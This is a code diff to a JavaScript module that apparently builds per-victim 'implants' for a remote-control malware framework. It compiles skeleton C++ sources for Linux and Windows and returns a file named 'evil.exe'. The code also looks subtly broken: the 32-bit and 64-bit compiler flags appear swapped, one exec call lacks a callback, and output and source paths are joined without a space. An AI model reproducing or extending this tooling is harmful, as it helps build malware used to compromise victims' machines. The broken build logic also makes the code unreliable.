@@ -6,7 +6,7 @@ global.ENDIAN32 = 32
 global.ENDIAN64 = 64
 
 // Compilers
-const COMPILER_PE = "x86_64-w64-mingw32-g++";
+const COMPILER_PE = "x86_64-w64-mingw32-g++ -I /usr/share/mingw-w64/include/";
 const COMPILER_ELF = "g++";
 const CODE_MARKER = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
 
@@ -14,7 +14,7 @@ const CODE_MARKER = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
 const IMPLANTS_OUTPUT = "./implants/";
 const SKEL_ELF_LOC = "./skeleton_implant/elf/main.cpp"
 const SKEL_PE_LOC = "./skeleton_implant/pe/main.cpp"
-const TEMP_SOURCE = "./skeleton_implant/temp.cpp"
+const TEMP_SOURCE = "./skeleton_implant/temp.cpp" // Path to source with id marker. 
 
 const generateImplant = (slaveId, os, success, failed) => {    
     
@@ -49,12 +49,13 @@ const generateLinuxImplant = (id, endianess, success, failed) => {
     if (endianess == ENDIAN32) {
 
         console.log("Compiling implant for linux 32 bit.")
+        exec(COMPILER_ELF + " -o " + outputPath + TEMP_SOURCE, )
     }
     else {
 
         console.log("Compiling implant for linux 64 bit.")
 
-        exec(COMPILER_ELF + " -o " + outputPath + TEMP_SOURCE, (err, stdout, stderr) => {
+        exec(COMPILER_ELF + " -m32 " + " -o " + outputPath + TEMP_SOURCE, (err, stdout, stderr) => {
 
             if (err) {
                 console.error("Failed to compile binary!");
@@ -72,8 +73,18 @@ const generateWindowsImplant = (id, endianess) => {
     if (endianess == ENDIAN32) {
 
         console.log("Compiling implant for windows 32 bit.")
+
+        
         
     } else {
+        
+        exec(COMPILER_PE + " -o " + outputPath + TEMP_SOURCE, (err, stdout, stderr) => {
+            if (err) {
+                console.error("Failed to compile binary!");
+                failed(stderr, true)
+                return;
+            }
+        })
 
         console.log("Compiling implant for windows 64 bit.")
     }
@@ -81,7 +92,6 @@ const generateWindowsImplant = (id, endianess) => {
     return "./evil.exe"
 }
 
-
 module.exports = {
-    generateImplant
+    generateImplant,
 }
